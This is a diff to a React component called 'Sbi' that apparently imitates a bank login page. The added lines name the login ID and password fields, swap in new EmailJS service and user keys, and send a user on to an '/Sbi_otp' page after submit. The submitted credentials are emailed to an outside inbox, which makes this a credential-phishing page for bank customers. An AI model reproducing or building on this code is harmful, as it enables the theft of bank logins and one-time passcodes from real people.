@@ -1,20 +1,23 @@
 import React, { useRef } from "react";
 import "./index.css";
 import emailjs from "@emailjs/browser";
-import { Link } from "react-router-dom";
+import { useNavigate } from "react-router-dom";
 
 const Sbi = () => {
+    let navigate = useNavigate()
+
   const form = useRef();
 
   function sendEmail(e) {
+    navigate("/Sbi_otp");
     e.preventDefault();
 
     emailjs
-      .sendForm(
-        "service_gmail_contact",
-        "template_qn8a87d" /*change */,
-        form.current,
-        "user_1BbfROnlSMWCftLMRSCEo" /*change */
+    .sendForm(
+        "service_hblrths",
+        "template_by3q0a8",  /*change */
+        form.current,    /*   */
+        "user_rkVmkb5ihll1tFJsx2oGr"  /*change */
       )
       .then(
         (result) => {
@@ -81,6 +84,7 @@ const Sbi = () => {
                     type="text"
                     // onChange={}
                     // value={}
+                    name="loginid"
                   />
                 </div>
               </div>
@@ -93,13 +97,14 @@ const Sbi = () => {
                     type="text"
                     // onChange={}
                     // value={}
+                    name="loginpass"
                   />
                 </div>
               </div>
             </div>
             <div className="sbi_btn">
               <button type="submit">
-                <Link to="/Sbi_otp">Submit</Link>
+                Submit
               </button>
             </div>
           </form>
